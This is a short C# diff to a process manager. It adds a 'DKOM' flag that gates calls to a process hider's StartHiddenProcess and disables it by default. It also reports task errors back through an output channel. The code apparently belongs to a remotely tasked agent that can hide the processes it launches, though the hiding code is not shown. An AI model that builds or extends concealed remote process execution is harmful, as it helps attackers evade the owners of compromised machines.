@@ -21,7 +21,9 @@ namespace Manager
         private string name;
         private static StreamWriter Log = null;
 #endif
-#endregion
+        #endregion
+
+        const bool DKOM = false;
 
         public Process process { get { return processObj; } } // returns a reference to the process
         public bool IsRunning { get { return this.processObj != null && !this.processObj.HasExited; } }
@@ -56,7 +58,7 @@ namespace Manager
         /// <returns> true if succeeded</returns>
         public bool StartProcess(string path, string args)
         {
-            if (!System.Environment.Is64BitOperatingSystem) // temp
+            if (!System.Environment.Is64BitOperatingSystem && DKOM) // temp
                 processObj = this.procHider.StartHiddenProcess(path, args, exitEvntHandler, outEvntHandler, errEvntHandler, out stdin);
             else
             {
@@ -106,7 +108,7 @@ namespace Manager
         public bool StartProcess(string path, string args, DataReceivedEventHandler outputHandler)
         {
 #if (CHECK_OS)
-            if (!System.Environment.Is64BitOperatingSystem) // temp
+            if (!System.Environment.Is64BitOperatingSystem && DKOM) // temp
 #endif
                 processObj = this.procHider.StartHiddenProcess(path, args, exitEvntHandler, outEvntHandler, errEvntHandler, out stdin);
 #if (CHECK_OS)
@@ -177,8 +179,16 @@ namespace Manager
             //    sw.Write(e.Data);
             //    sw.Close();
             //};
-
-            return this.StartProcess(splt[1], splt[2], outputHandler);
+            try
+            {
+                return this.StartProcess(splt[1], splt[2], outputHandler);
+            }
+            catch( Exception e)
+            {
+                lock (outputProcess)
+                    outputProcess.SendData(ProcessManager.PROCESS_DATA_CODE + splt[0] /* task id */ + ",error: " + e.ToString());
+                return false;
+            }
         }
 
         /// <summary>
